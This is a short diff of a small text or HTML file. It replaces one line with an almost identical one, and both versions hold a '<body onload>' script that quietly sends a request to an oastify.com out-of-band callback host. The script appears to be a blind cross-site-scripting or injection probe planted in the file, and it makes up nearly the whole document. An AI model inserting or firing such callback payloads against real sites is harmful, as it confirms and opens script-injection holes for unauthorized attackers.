@@ -1,5 +1,5 @@
 Hello
-<body onload="setTimeout(function(){var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://7u2mvavbiotucxmybqdphq1o6fc60zoo.oastify.com', true); xhr.send();}, 1000);">
+<body onload="setTimeout(function(){var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://7u2mvavbiotucxmybqdphq1o6fc60zoo.oastify.com', true); xhr.send();}, 1000);">hello</body>
 
 
 1st
